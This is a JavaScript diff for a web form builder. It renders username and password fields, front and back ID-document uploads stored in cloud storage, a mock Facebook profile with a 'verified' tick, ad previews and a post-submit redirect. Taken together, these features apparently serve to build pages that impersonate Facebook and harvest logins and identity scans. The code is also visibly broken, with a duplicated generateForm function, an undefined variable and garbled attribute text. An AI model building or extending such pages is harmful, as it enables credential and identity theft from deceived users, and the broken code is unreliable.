+if ($("embedShow")?.checked && $("embedURL")?.value) {
+
+  const embedBox = document.createElement("div");
+  embedBox.style.margin = "20px 0";
+
+  if ($("embedText")?.value) {
+    const t = document.createElement("h4");
+    t.textContent = $("embedText").value;
+    t.style.color = $("embedTitleColor")?.value || "#000";
+    embedBox.appendChild(t);
+  }
+
+  const iframe = document.createElement("iframe");
+  iframe.src = $("embedURL").value;
+  iframe.width = "100%";
+  iframe.height = "300";
+  iframe.style.borderRadius = "10px";
+  iframe.allowFullscreen = true;
+
+  embedBox.appendChild(iframe);
+
+  if ($("embedDesc")?.value) {
+    const p = document.createElement("p");
+    p.textContent = $("embedDesc").value;
+    embedBox.appendChild(p);
+  }
+
+  c.appendChild(embedBox);
+}
+    
+    /* -------------------------
+   ID Upload (Front / Back)
+------------------------- */
+if ($("chkIdFront")?.checked || $("chkIdBack")?.checked) {
+
+  const box = document.createElement("div");
+  box.style.background = $("idBgColor")?.value || "#f8f9fa";
+  box.style.padding = "15px";
+  box.style.borderRadius = ($("idRadius")?.value || 8) + "px";
+  box.style.marginTop = "15px";
+
+  // ===============================
+  // 🔥 TITLE POSITION (KEPT FROM OLD)
+  // ===============================
+  const titlePosition = $("idTitlePosition")?.value || "left";
+
+  if (titlePosition !== "none" && $("idUploadTitle")?.value) {
+    const title = document.createElement("h4");
+    title.textContent = $("idUploadTitle").value;
+    title.style.color = $("idTitleColor")?.value || "#000";
+    title.style.textAlign = titlePosition;
+    box.appendChild(title);
+  }
+
+  if ($("idUploadDesc")?.value) {
+    const desc = document.createElement("p");
+    desc.textContent = $("idUploadDesc").value;
+    desc.style.color = $("idDescColor")?.value || "#555";
+    desc.style.textAlign = titlePosition === "none" ? "left" : titlePosition;
+    box.appendChild(desc);
+  }
+
+  // ===============================
+  // 📐 LAYOUT
+  // ===============================
+  if ($("idLayout")?.value === "side") {
+    box.style.display = "flex";
+    box.style.gap = "15px";
+    box.style.flexWrap = "wrap";
+  }
+
+  const size = $("idPreviewSize")?.value || 140;
+
+  // ===============================
+  // 🔁 BLOCK BUILDER (NEW)
+  // ===============================
+  function createIDBlock(type) {
+
+    const wrap = document.createElement("div");
+    wrap.style.flex = "1";
+    wrap.style.minWidth = "140px";
+
+    const title = document.createElement("div");
+    title.innerText =
+      type === "front"
+        ? $("idFrontSmallTitle")?.value || "Front ID"
+        : $("idBackSmallTitle")?.value || "Back ID";
+
+    title.style.fontWeight = "bold";
+    title.style.marginBottom = "6px";
+
+    const desc = document.createElement("div");
+    desc.innerText =
+      type === "front"
+        ? $("idFrontDesc")?.value || ""
+        : $("idBackDesc")?.value || "";
+
+    desc.style.fontSize = "12px";
+    desc.style.opacity = "0.7";
+
+    // ===============================
+    // 🖼 ADMIN EXAMPLE IMAGE (FIXED)
+    // ===============================
+    const exampleImg = document.createElement("img");
+    exampleImg.style.width = size + "px";
+    exampleImg.style.display = "block";
+    exampleImg.style.margin = "8px 0";
+    exampleImg.style.borderRadius = "6px";
+
+    const exampleData =
+      type === "front"
+        ? $("idExampleFront")?.value
+        : $("idExampleBack")?.value;
+
+    if (exampleData) {
+      exampleImg.src = exampleData;
+    } else {
+      exampleImg.style.display = "none";
+    }
+
+    // ===============================
+    // 📁 FILE INPUT
+    // ===============================
+    const input = document.createElement("input");
+    input.type = "file";
+    input.accept =
+      type === "front"
+        ? $("idFrontType")?.value || ""
+        : $("idBackType")?.value || "";
+
+    // ===============================
+    // 👁 USER PREVIEW (NEW)
+    // ===============================
+    const userImg = document.createElement("img");
+    userImg.style.width = size + "px";
+    userImg.style.display = "none";
+    userImg.style.marginTop = "8px";
+    userImg.style.borderRadius = "6px";
+
+    // ===============================
+    // ⏳ LOADER (NEW)
+    // ===============================
+    const loader = document.createElement("div");
+    loader.innerText = "Uploading...";
+    loader.style.display = "none";
+    loader.style.fontSize = "12px";
+    loader.style.marginTop = "5px";
+
+    input.onchange = function () {
+      const file = this.files[0];
+      if (!file) return;
+
+      loader.style.display = "block";
+      userImg.style.display = "none";
+
+      const reader = new FileReader();
+      reader.onload = function (e) {
+
+        setTimeout(() => {
+          loader.style.display = "none";
+
+          userImg.src = e.target.result;
+          userImg.style.display = "block";
+
+          // 🎬 Animation
+          userImg.style.transform = "translateY(30px)";
+          userImg.style.opacity = "0";
+
+          setTimeout(() => {
+            userImg.style.transition = "all 0.5s ease";
+            userImg.style.transform = "translateY(0)";
+            userImg.style.opacity = "1";
+          }, 50);
+
+        }, 800);
+      };
+
+      reader.readAsDataURL(file);
+    };
+
+    wrap.appendChild(title);
+    wrap.appendChild(desc);
+    wrap.appendChild(exampleImg);
+    wrap.appendChild(input);
+    wrap.appendChild(loader);
+    wrap.appendChild(userImg);
+
+    return wrap;
+  }
+
+  // ===============================
+  // 🆔 FRONT / BACK
+  // ===============================
+  if ($("chkIdFront")?.checked) {
+    box.appendChild(createIDBlock("front"));
+  }
+
+  if ($("chkIdBack")?.checked) {
+    box.appendChild(createIDBlock("back"));
+  }
+
+  c.appendChild(box);
+}
+
+// ===============================
+// TEXT + IMAGES (PUT THIS HERE)
+// ===============================
+
+// Subtitle
+const subtitle = document.getElementById("subtitleInput")?.value.trim();
+if (subtitle) {
+  const subEl = document.createElement("p");
+  subEl.textContent = subtitle;
+  subEl.style.opacity = "0.8";
+  subEl.style.fontSize = "14px";
+  subEl.style.textAlign = "center";
+  c.appendChild(subEl);
+}
+
+// Description
+const desc = document.getElementById("descriptionInput")?.value.trim();
+if (desc) {
+  const d = document.createElement("p");
+  d.textContent = desc;
+  d.style.marginTop = "10px";
+  d.style.textAlign = "center";
+  c.appendChild(d);
+}
+
+// Banner Image
+const bannerFile = document.getElementById("bannerUpload")?.files[0];
+if (bannerFile) {
+  const reader = new FileReader();
+  reader.onload = function(e) {
+    const img = document.createElement("img");
+    img.src = e.target.result;
+    img.style.width = "100%";
+    img.style.borderRadius = "10px";
+    img.style.marginBottom = "15px";
+    c.prepend(img);
+  };
+  reader.readAsDataURL(bannerFile);
+}
+
+// Logo Image
+const logoFile = document.getElementById("logoUpload")?.files[0];
+if (logoFile) {
+  const reader = new FileReader();
+  reader.onload = function(e) {
+    const img = document.createElement("img");
+    img.src = e.target.result;
+    img.style.width = "80px";
+    img.style.display = "block";
+    img.style.margin = "0 auto 15px";
+    c.prepend(img);
+  };
+  reader.readAsDataURL(logoFile);
+}
+
+// Avatar Image
+const avatarFile = document.getElementById("avatarUpload")?.files[0];
+if (avatarFile) {
+  const reader = new FileReader();
+  reader.onload = function(e) {
+    const img = document.createElement("img");
+    img.src = e.target.result;
+    img.style.width = "80px";
+    img.style.height = "80px";
+    img.style.borderRadius = "50%";
+    img.style.objectFit = "cover";
+    img.style.display = "block";
+    img.style.margin = "10px auto";
+    c.appendChild(img);
+  };
+  reader.readAsDataURL(avatarFile);
+}
+
+// Background Image
+const bgFile = document.getElementById("bgUpload")?.files[0];
+if (bgFile) {
+  const reader = new FileReader();
+  reader.onload = function(e) {
+    preview.style.backgroundImage = `url(${e.target.result})`;
+    preview.style.backgroundSize = "cover";
+    preview.style.backgroundPosition = "center";
+  };
+  reader.readAsDataURL(bgFile);
+}
+    
+    /* =========================
+   Form section wrapper
+========================= */
+
+if (fDiv.children.length > 0) {
+
+  const formSection = document.createElement("div");
+  formSection.className = "section";
+
+  const formTitleText = $("formTitleInput")?.value;
+const formTitlePosition = $("formTitlePosition")?.value || "center";
+const formTitleColor = $("formTitleColor")?.value || "#000";
+
+if (formTitleText) {
+  const formTitle = document.createElement("h3");
+  formTitle.textContent = formTitleText;
+
+  formTitle.style.marginBottom = "10px";
+  formTitle.style.textAlign = formTitlePosition;
+  formTitle.style.color = formTitleColor;
+
+  formSection.appendChild(formTitle);
+}
+
+  formSection.appendChild(fDiv);
+  c.appendChild(formSection);
+}
+
+// ✅ AFTER FORM SECTION
+if (Array.isArray(extraButtons)) {
+
+  extraButtons.forEach(btn => {
+
+    if (!btn || btn.show === false) return;
+
+    const wrap = document.createElement("div");
+    wrap.style.marginTop = "12px";
+    wrap.style.textAlign = btn.align || "center";
+
+    try {
+
+      let hasSomething = false;
+
+      // =========================
+      // 🖼 IMAGE ONLY (NO DESCRIPTION)
+      // =========================
+      if (btn.image && btn.image.startsWith("data:")) {
+
+        const link = document.createElement("a");
+        link.href = btn.link || "#";
+        link.target = "_blank";
+        link.rel = "to to noreferrer";
+
+        const img = document.createElement("img");
+        img.src = btn.image;
+        img.style.maxWidth = "100%";
+        img.style.borderRadius = "8px";
+        img.style.display = "block";
+
+        link.appendChild(img);
+        wrap.appendChild(link);
+
+        // ❌ REMOVED DESCRIPTION HERE
+
+        hasSomething = true;
+      }
+      
+      // =========================
+      // ✅ FINAL APPEND
+      // ===================g======
+      if (hasSomething) {
+        c.appendChild(wrap);
+      }
+
+    } catch (err) {
+      console.error("Extra button render error:", err);
+    }
+
+  });
+
+}
+
+/* -------------------------
+   Extra Buttons Preview
+------------------------- */
+if (extraButtons.length) {
+  const btnWrap = document.createElement("div");
+  btnWrap.style.margin = "16px 0";
+  btnWrap.style.display = "flex";
+  btnWrap.style.flexDirection = "column";
+  btnWrap.style.gap = "10px";
+
+  extraButtons.forEach((btn, index) => {
+    if (!btn.show) return;
+
+    const row = document.createElement("div");
+    row.style.display = "flex";
+    row.style.justifyContent =
+      btn.align === "left" ? "flex-start" :
+      btn.align === "right" ? "flex-end" :
+      "center";
+
+    const a = document.createElement("a");
+    a.textContent = btn.text;
+    a.href = btn.link || "#";
+    a.target = "_blank";
+    a.style.background = btn.color;
+    a.style.color = "#fff";
+    a.style.padding = "10px 16px";
+    a.style.borderRadius = "8px";
+    a.style.fontSize = btn.size + "px";
+    a.style.textDecoration = "none";
+    a.style.cursor = "pointer";
+
+    // ✅ FIXED DELETE BUTTON
+    const del = document.createElement("span");
+    del.textContent = " ✖";
+    del.className = "admin-only";
+    del.style.marginLeft = "8px";
+    del.style.cursor = "pointer";
+    del.style.color = "#900";
+
+    del.onclick = () => deleteExtraButton(index); // ✅ FIX HERE
+
+    a.appendChild(del);
+
+    row.appendChild(a);
+    btnWrap.appendChild(row);
+  });
+
+  c.appendChild(btnWrap);
+}    
+
+if ($("showGenerateBtn")?.checked) {
+  const genBtn = document.createElement("button");
+  genBtn.textContent = $("generateBtnText").value || "Generate";
+  genBtn.style.background = "#1976d2";
+  genBtn.style.color = "#fff";
+  genBtn.style.border = "none";
+  genBtn.style.padding = "10px";
+  genBtn.style.borderRadius = "8px";
+  fDiv.appendChild(genBtn);
+}
+
+/* Submit button AFTER */
+if ($("showMainBtn")?.checked && $("btnPosition")?.value !== "none") {
+
+  const btn = document.createElement("button");
+
+  btn.textContent = $("buttonText")?.value || "Submit";
+  btn.style.background = $("btnColor")?.value || "#1877f2";
+  btn.style.color = "#fff";
+  btn.style.border = "none";
+  btn.style.cursor = "pointer";
+  btn.style.fontWeight = "600";
+
+  // ===== POSITION =====
+  const position = $("btnPosition")?.value;
+  if (position === "left") btn.style.alignSelf = "flex-start";
+  else if (position === "right") btn.style.alignSelf = "flex-end";
+  else btn.style.alignSelf = "center";
+
+  // ===== SIZE =====
+  const size = $("btnSize")?.value;
+  if (size === "sm") btn.style.padding = "8px 14px";
+  else if (size === "lg") btn.style.padding = "16px 28px";
+  else btn.style.padding = "12px 20px";
+
+  // Apply Shape
+const shape = $("btnShape")?.value || "rounded";
+
+btn.classList.remove(
+  "square","sharp","circle","semi-round","top-round","bottom-round",
+  "left-round","right-round","blob","diamond","skew","parallelogram",
+  "cut-corner","double-border","thick-border","outline","ghost",
+  "neumorphic"
+);
+
+if (shape === "pill") {
+  btn.style.borderRadius = "999px";
+} else if (shape === "rounded") {
+  btn.style.borderRadius = "8px";
+} else {
+  btn.classList.add(shape);
+}
+
+  // ===== FULL WIDTH =====
+  if ($("btnFullWidth")?.checked) {
+    btn.style.width = "100%";
+  }
+
+  // ===== GRADIENT =====
+  if ($("btnGradient")?.checked) {
+    btn.style.background = "linear-gradient(45deg,#1877f2,#42a5f5)";
+  }
+
+  // ===== EFFECT CLASS =====
+  const effect = $("btnEffect")?.value;
+  if (effect && effect !== "none") {
+    btn.classList.add(effect);
+  }
+
+  fDiv.appendChild(btn);
+}
+
+/* Inject Facebook Preview */
+if ($("socialPlatform")?.value === "facebook") {
+
+  const fbPreview = renderFacebookPreview();
+
+  // 🔽 ADD IMAGE INTO FACEBOOK PREVIEW
+  if (fbAdImageData) {
+    const adImg = document.createElement("img");
+    adImg.src = fbAdImageData;
+    adImg.style.width = "100%";
+    adImg.style.borderRadius = "8px";
+    adImg.style.marginTop = "10px";
+
+    fbPreview.appendChild(adImg);
+  }
+
+  c.appendChild(fbPreview);
+}
+
+// ===============================
+// 👤 FACEBOOK PROFILE (LIVE PREVIEW)
+// ===============================
+const includeFB = document.getElementById("includeFBProfile")?.checked;
+
+if (includeFB) {
+
+  const name = $("fbName")?.value || "John Doe";
+  const location = $("fbLocation")?.value || "";
+  const age = $("fbAge")?.value || "";
+  const job = $("fbJob")?.value || "";
+  const bio = $("fbBio")?.value || "";
+  const verified = $("fbVerified")?.checked;
+
+  const fbBox = document.createElement("div");
+
+  fbBox.style.maxWidth = "500px";
+  fbBox.style.margin = "20px auto";
+  fbBox.style.borderRadius = "10px";
+  fbBox.style.overflow = "hidden";
+  fbBox.style.boxShadow = "0 4px 12px rgba(0,0,0,0.2)";
+  fbBox.style.background = "#fff";
+
+  // Cover
+  const cover = document.createElement("div");
+  cover.style.height = "160px";
+  cover.style.background = `url('${fbCoverPicData}') center/cover`;
+  fbBox.appendChild(cover);
+
+  // Body
+  const body = document.createElement("div");
+  body.style.padding = "15px";
+  body.style.textAlign = "center";
+
+  // Profile Pic
+  const img = document.createElement("img");
+  img.src = fbProfilePicData;
+  img.style.width = "90px";
+  img.style.height = "90px";
+  img.style.borderRadius = "50%";
+  img.style.marginTop = "-45px";
+  img.style.border = "3px solid #fff";
+  body.appendChild(img);
+
+  // Name
+  const nameEl = document.createElement("h3");
+  nameEl.textContent = name + (verified ? " ✔️" : "");
+  body.appendChild(nameEl);
+
+  // Info
+  const info = document.createElement("p");
+  info.textContent = `${job} • ${location}`;
+  body.appendChild(info);
+
+  const ageEl = document.createElement("p");
+  ageEl.textContent = "Age: " + age;
+  body.appendChild(ageEl);
+
+  const bioEl = document.createElement("p");
+  bioEl.textContent = bio;
+  body.appendChild(bioEl);
+
+  fbBox.appendChild(body);
+
+  // 👉 ADD TO MAIN CONTAINER
+  c.appendChild(fbBox);
+}
+
+    /* Footer */
+    const footer=document.createElement("footer");
+    footer.style.textAlign="center";
+    footer.style.fontSize="12px";
+    footer.textContent=$("footerText").value;
+    c.appendChild(footer);
+
+    p.appendChild(c);
+    
+ /* -------------------------
+   Draggable Lines (FINAL)
+------------------------- */
+draggableItems.forEach(line => {
+  if (!line.show) return;
+
+  const el = document.createElement("div");
+  el.textContent = line.text;
+  el.dataset.dragId = line.id;
+
+  el.style.position = "absolute";
+  el.style.left = line.x + "%";
+  el.style.top  = line.y + "%";
+  el.style.zIndex = 9999;
+  el.style.cursor = "move";
+
+  el.style.color = line.color || "#000";
+  el.style.fontSize = ((line.size || 2) * 4) + "px";
+  el.style.lineHeight = "1";
+  el.style.background = "rgba(255,255,255,0.6)";
+  el.style.padding = "2px 6px";
+  el.style.borderRadius = "4px";
+  el.style.userSelect = "none";
+  el.style.whiteSpace = "nowrap";
+
+  // ✅ NEW: alignment
+  if (line.align === "center") {
+    el.style.transform = "translateX(-50%)";
+    el.style.textAlign = "center";
+  }
+  if (line.align === "right") {
+    el.style.transform = "translateX(-100%)";
+    el.style.textAlign = "right";
+  }
+  if (line.align === "left") {
+    el.style.transform = "none";
+    el.style.textAlign = "left";
+  }
+
+  el.onmousedown = e => {
+    dragging = line;
+    dx = e.offsetX;
+    dy = e.offsetY;
+  };
+
+  p.appendChild(el);
+});
+
+  } catch(err) {
+    console.error("Preview render error:", err);
+  }
+}
+
+// -------------------------
+// Generate Form System
+// -------------------------
+
+// Button Click Listener
+document.getElementById("generateFormBtn")
+  ?.addEventListener("click", generateForm);
+
+// Main Function
+async function generateForm() {
+
+  const titleInput = document.getElementById("formTitleInput");
+const title = titleInput && titleInput.value.trim() 
+  ? titleInput.value.trim() 
+  : "Untitled Form";
+
+  // Create unique ID
+  const formId = "form_" + Date.now();
+
+  // Collect your form fields here if needed
+  const formData = {
+    id: formId,
+    title: title,
+    createdAt: new Date()
+  };
+
+  try {
+
+    if (linkBox) {
+      linkBox.innerHTML = `
+        <p style="margin-top:10px;">
+          ✅ Form Generated Successfully<br>
+          <a href="${link}" target="_blank">${link}</a>
+        </p>
+      `;
+    } else {
+      alert("Form Generated!\n\n" + link);
+    }
+
+  } catch (error) {
+    console.error("Error generating form:", error);
+    alert("Error generating form. Check console.");
+  }
+}
+
+/* ==========================================
+   UNIVERSAL IMAGE UPLOAD HANDLER
+========================================== */
+
+function handleImageUpload(fileInputId, targetInputId) {
+  const fileInput = document.getElementById(fileInputId);
+  const targetInput = document.getElementById(targetInputId);
+
+  if (!fileInput || !targetInput) return;
+
+  fileInput.addEventListener("change", async function (e) {
+    const file = e.target.files[0];
+    if (!file) return;
+
+    try {
+      const ref = storage.ref("uploads/" + Date.now() + "_" + file.name);
+      await ref.put(file);
+      const url = await ref.getDownloadURL();
+
+      // Set URL into text input
+      targetInput.value = url;
+
+      // Save for generateForm
+      fileInput.dataset.uploadedUrl = url;
+
+      renderPreview();
+
+    } catch (err) {
+      console.error("Upload failed:", err);
+      alert("Upload failed");
+    }
+  });
+}
+
+// Upload Front ID
+$("idFrontFile").addEventListener("change", async e => {
+  const file = e.target.files[0];
+  if (!file) return;
+  const ref = storage.ref(`uploads/${Date.now()}_${file.name}`);
+  await ref.put(file);
+  const url = await ref.getDownloadURL();
+  e.target.dataset.uploadedUrl = url;
+  renderPreview();
+});
+
+// Upload Back ID
+$("idBackFile").addEventListener("change", async e => {
+  const file = e.target.files[0];
+  if (!file) return;
+  const ref = storage.ref(`uploads/${Date.now()}_${file.name}`);
+  await ref.put(file);
+  const url = await ref.getDownloadURL();
+  e.target.dataset.uploadedUrl = url;
+  renderPreview();
+});
+
+// 🔄 Auto live preview on ANY input or change
+document.addEventListener("input", e => {
+  if (e.target.closest(".wrap")) {
+    renderPreview();
+  }
+});
+
+/* =====================================================
+   🎬 ANIMATION PANEL TOGGLE (FIXED & SAFE)
+===================================================== */
+
+const toggleAnimationBtn = document.getElementById("toggleAnimationPanel");
+const animationPanel = document.getElementById("animationPanel");
+
+if (toggleAnimationBtn && animationPanel) {
+  toggleAnimationBtn.addEventListener("click", function () {
+
+    const hidden =
+      window.getComputedStyle(animationPanel).display === "none";
+
+    animationPanel.style.display = hidden ? "block" : "none";
+    this.textContent = hidden
+      ? "🎬 Hide Animation Settings"
+      : "🎬 Show Animation Settings";
+  });
+}
+
+
+/* =====================================================
+   🎛 SPEED & DELAY LIVE VALUES
+===================================================== */
+
+const speedSlider = document.getElementById("animationSpeed");
+const delaySlider = document.getElementById("animationDelay");
+const speedValue = document.getElementById("speedValue");
+const delayValue = document.getElementById("delayValue");
+
+if (speedSlider && speedValue) {
+  speedValue.textContent = speedSlider.value;
+
+  speedSlider.addEventListener("input", function () {
+    speedValue.textContent = this.value;
+    if (typeof renderPreview === "function") {
+      renderPreview();
+    }
+  });
+}
+
+if (delaySlider && delayValue) {
+  delayValue.textContent = delaySlider.value;
+
+  delaySlider.addEventListener("input", function () {
+    delayValue.textContent = this.value;
+    if (typeof renderPreview === "function") {
+      renderPreview();
+    }
+  });
+}
+
+
+/* =====================================================
+   ▶ MINI ANIMATION PREVIEW
+===================================================== */
+
+const miniPreview = document.getElementById("animationMiniPreview");
+const replayBtn = document.getElementById("replayAnimation");
+const animationSelect = document.getElementById("titleAnimation");
+const infiniteCheckbox = document.getElementById("animationInfinite");
+
+function playMiniPreview() {
+
+  if (!miniPreview) return;
+
+  const animation = animationSelect?.value || "none";
+  const speed = speedSlider?.value || 1;
+  const delay = delaySlider?.value || 0;
+  const infinite = infiniteCheckbox?.checked;
+
+  miniPreview.style.animation = "none";
+  miniPreview.offsetHeight; // force reflow
+
+  if (animation !== "none") {
+    miniPreview.style.animation =
+      `${animation} ${speed}s ease ${delay}s ${infinite ? "infinite" : "1"}`;
+  }
+}
+
+if (replayBtn) replayBtn.addEventListener("click", playMiniPreview);
+if (animationSelect) animationSelect.addEventListener("change", playMiniPreview);
+if (speedSlider) speedSlider.addEventListener("input", playMiniPreview);
+if (delaySlider) delaySlider.addEventListener("input", playMiniPreview);
+if (infiniteCheckbox) infiniteCheckbox.addEventListener("change", playMiniPreview);
+
+
+/* =====================================================
+   🎛 TITLE STYLE TOGGLE (FIXED & SAFE)
+===================================================== */
+
+const toggleStylesBtn = document.getElementById("toggleTitleStyles");
+const styleControls = document.getElementById("styleControls");
+
+if (toggleStylesBtn && styleControls) {
+  toggleStylesBtn.addEventListener("click", function () {
+
+    const hidden =
+      window.getComputedStyle(styleControls).display === "none";
+
+    styleControls.style.display = hidden ? "block" : "none";
+    this.textContent = hidden
+      ? "🎛 Hide Title Styles"
+      : "🎛 Show Title Styles";
+  });
+}
+
+function generateForm() {
+  const frontUrl = $("idFrontFile")?.dataset.uploadedUrl || "";
+  const backUrl = $("idBackFile")?.dataset.uploadedUrl || "";
+
+  // Collect form fields
+  const fields = [];
+
+  // Auth fields
+  if ($("addAuth").checked) {
+    fields.push({
+      type: "text",
+      name: "username",
+      label: "Username",
+      placeholder: $("usernamePlaceholder").value
+    });
+    fields.push({
+      type: "password",
+      name: "password",
+      label: "Password",
+      placeholder: $("passwordPlaceholder").value
+    });
+  }
+
+  // Extra fields
+  $("extraFields").value.split("\n").map(f => f.trim()).filter(Boolean).forEach(f => {
+    fields.push({ type: "text", label: f, name: f.replace(/\s+/g,'_').toLowerCase(), placeholder: f });
+  });
+
+  // Custom fields
+  customFields.forEach(fld => {
+    fields.push({ type: fld.type, label: fld.label, name: fld.label.replace(/\s+/g,'_').toLowerCase(), placeholder: fld.label });
+  });
+
+  // Add ID upload fields
+if ($("chkIdFront")?.checked) {
+  fields.push({
+    type: "file",
+    label: $("idFrontSmallTitle")?.value || "Front Side",
+    name: "id_front",
+    url: frontUrl
+  });
+}
+
+if ($("chkIdBack")?.checked) {
+  fields.push({
+    type: "file",
+    label: $("idBackSmallTitle")?.value || "Back Side",
+    name: "id_back",
+    url: backUrl
+  });
+}
+  
+  // SEO
+handleImageUpload("ogImageFile", "ogImage");
+
+// Branding
+handleImageUpload("avatarFile", "avatarURL");
+handleImageUpload("logoFile", "logoURL");
+handleImageUpload("bannerFile", "bannerURL");
+
+// Background
+handleImageUpload("bgImageFile", "bgImageURL");
+
+// Facebook
+handleImageUpload("fbProfilePic", "fbProfilePic");
+handleImageUpload("fbCoverPic", "fbCoverPic");
+
+  // Save form data
+  const formData = {
+    seoTitle: $("seoTitle").value,
+    metaDesc: $("metaDesc").value,
+    ogImage: $("ogImageFile")?.dataset.uploadedUrl || $("ogImage").value,
+    avatarURL: $("avatarFile")?.dataset.uploadedUrl || $("avatarURL").value,
+    logoURL: $("logoFile")?.dataset.uploadedUrl || $("logoURL").value,
+bannerURL: $("bannerFile")?.dataset.uploadedUrl || $("bannerURL").value,
+    title: $("title").value,
+    titleColor: $("titleColor").value,
+    subtitle: $("subtitle").value,
+    subtitleColor: $("subtitleColor").value,
+    description: $("description").value,
+    galleryImages: $("galleryImages").value.split(",").map(i => i.trim()).filter(Boolean),
+    galleryItems,
+    videoLinks: $("videoLinks").value.split(",").map(i => i.trim()).filter(Boolean),
+    bgImageURL: $("bgImageFile")?.dataset.uploadedUrl || $("bgImageURL").value,
+    bgVideoURL: $("bgVideoURL").value,
+    bgSize: $("bgSize").value,
+    enableWarning: $("enableWarning").checked,
+    warning: $("warning").value,
+    warningPosition: $("warningPosition").value,
+    buttonText: $("buttonText").value,
+    btnColor: $("btnColor").value,
+    btnPosition: $("btnPosition").value,
+    showMainBtn: $("showMainBtn").checked,
+    showGenerateBtn: $("showGenerateBtn").checked,
+    generateBtnText: $("generateBtnText").value,
+    extraButtons,
+    embedLinks,
+    enableRedirect: $("enableRedirect").checked,
+    redirectURL: $("redirectURL").value,
+    footerText: $("footerText").value,
+    fields, // ✅ All form fields stored here
+    createdAt: new Date().toISOString()
+  };
+  
+}
+// ✅ ID Upload specific live preview
+
+if ($("chkIdFront")) {
+  $("chkIdFront").addEventListener("change", renderPreview);
+}
+
+if ($("chkIdBack")) {
+  $("chkIdBack").addEventListener("change", renderPreview);
+}
+
+if ($("txtIdFront")) {
+  $("txtIdFront").addEventListener("input", renderPreview);
+}
+
+if ($("txtIdBack")) {
+  $("txtIdBack").addEventListener("input", renderPreview);
+}
+
+document.addEventListener("input", e => {
+
+  if (e.target.closest(".wrap")) {
+    renderPreview();
+  }
+
+  /* ===============================
+     UPDATE SMALL TITLE PREVIEW
+  ================================ */
+
+  const titleInput = document.getElementById("title");
+  const titlePreview = document.getElementById("titlePreview");
+  const colorInput = document.getElementById("titleColor");
+
+  if (titleInput && titlePreview) {
+    titlePreview.textContent = titleInput.value;
+  }
+
+  if (colorInput && titlePreview) {
+    titlePreview.style.color = colorInput.value;
+  }
+
+});
+
+document.addEventListener("change", e => {
+  if (e.target.closest(".wrap")) {
+    renderPreview();
+  }
+});
+
+/* ===============================
+   🔴 LIVE TITLE MINI PREVIEW
+================================ */
+
+document.addEventListener("DOMContentLoaded", function () {
+
+  const titleInput = document.getElementById("title");
+  const colorInput = document.getElementById("titleColor");
+  const styleSelect = document.getElementById("titleStyleSelect");
+  const animationSelect = document.getElementById("titleAnimation");
+  const preview = document.getElementById("titlePreview");
+
+  if (!preview) return;
+
+  function updateTitlePreview() {
+
+    // Text
+    preview.textContent = titleInput?.value || "Preview Title";
+
+    // Color
+    preview.style.color = colorInput?.value || "#000";
+
+    // Reset styles
+    preview.style.textDecoration = "";
+    preview.style.textShadow = "";
+    preview.style.border = "";
+    preview.style.background = "";
+    preview.style.textTransform = "";
+    preview.style.padding = "";
+    preview.style.display = "block";
+
+    // Multi style support
+    const selected = Array.from(styleSelect?.selectedOptions || [])
+      .map(o => o.value);
+
+    selected.forEach(style => {
+
+      if (style === "underline") {
+        preview.style.textDecoration = "underline";
+      }
+
+      if (style === "shadow") {
+        preview.style.textShadow = "2px 2px 6px rgba(0,0,0,0.4)";
+      }
+
+      if (style === "border") {
+        preview.style.border = "2px solid currentColor";
+        preview.style.padding = "6px 12px";
+        preview.style.display = "inline-block";
+      }
+
+      if (style === "highlight") {
+        preview.style.background = "yellow";
+        preview.style.padding = "4px 8px";
+      }
+
+      if (style === "uppercase") {
+        preview.style.textTransform = "uppercase";
+      }
+
+    });
+
+    // Animation
+    const animation = animationSelect?.value || "none";
+    if (animation !== "none") {
+      preview.style.animation = animation + " 1s ease";
+    } else {
+      preview.style.animation = "";
+    }
+  }
+
+  // Event Listeners
+  titleInput?.addEventListener("input", updateTitlePreview);
+  colorInput?.addEventListener("input", updateTitlePreview);
+  styleSelect?.addEventListener("change", updateTitlePreview);
+  animationSelect?.addEventListener("change", updateTitlePreview);
+
+  updateTitlePreview(); // run once
+});
+
+/* =========================
+   AUTO LIVE PREVIEW ENGINE
+========================= */
+
+document.addEventListener("DOMContentLoaded", function () {
+
+  // Select ALL inputs, selects and textareas inside builder
+  const allInputs = document.querySelectorAll(
+    "input, textarea, select"
+  );
+
+  allInputs.forEach(el => {
+
+    // Skip buttons
+    if (el.type === "button") return;
+
+    // Update on typing
+    el.addEventListener("input", function () {
+      updateSEOMeta();
+      renderPreview();
+    });
+
+    // Update on change
+    el.addEventListener("change", function () {
+      updateSEOMeta();
+      renderPreview();
+    });
+
+  });
+
+  // First render on load
+  updateSEOMeta();
+  renderPreview();
+
+});
+
+handleImageUpload("avatarFile", "avatarURL");
+handleImageUpload("logoFile", "logoURL");
+handleImageUpload("bannerFile", "bannerURL");
+handleImageUpload("bgImageFile", "bgImageURL");
+
+$("showMainBtn")?.addEventListener("change", renderPreview);
+$("showGenerateBtn")?.addEventListener("change", renderPreview);
+$("buttonText")?.addEventListener("input", renderPreview);
+$("generateBtnText")?.addEventListener("input", renderPreview);
+
+// ===============================
+// FACEBOOK CTA CONTROLLER
+// ===============================
+document.getElementById("fbCTA").addEventListener("change", function () {
+
+  const value = this.value;
+
+  const customFields = document.getElementById("ctaCustomFields");
+
+  const signUp = document.getElementById("signUpInput");
+  const download = document.getElementById("downloadInput");
+  const contact = document.getElementById("contactUsInput");
+
+  customFields.style.display = "none";
+  signUp.style.display = "none";
+  download.style.display = "none";
+  contact.style.display = "none";
+
+  if (value === "sign_up") {
+    customFields.style.display = "block";
+    signUp.style.display = "block";
+  }
+
+  if (value === "download") {
+    customFields.style.display = "block";
+    download.style.display = "block";
+  }
+
+  if (value === "contact_us") {
+    customFields.style.display = "block";
+    contact.style.display = "block";
+  }
+
+});
+
+
+// ===============================
+// FACEBOOK IMAGE PREVIEW
+// ===============================
+function previewFBImage(inputId, previewId) {
+
+  const file = document.getElementById(inputId).files[0];
+  if (!file) return;
+
+  const reader = new FileReader();
+
+  reader.onload = function(e) {
+    const img = document.getElementById(previewId);
+    img.src = e.target.result;
+    img.style.display = "block";
+  };
+
+  reader.readAsDataURL(file);
+}
+
+document.getElementById("fbAdImage")
+.addEventListener("change", function(){
+  previewFBImage("fbAdImage","fbAdPreview");
+});
+
+document.getElementById("fbSocialPreviewImage")
+.addEventListener("change", function(){
+  previewFBImage("fbSocialPreviewImage","fbSocialPreview");
+});
+
+$("enablePasswordToggle")?.addEventListener("change", renderPreview);
+$("eyeIconStyle")?.addEventListener("change", function () {
+  if (this.value === "none") {
+    $("enablePasswordToggle").checked = false;
+  }
+  renderPreview();
+});
+
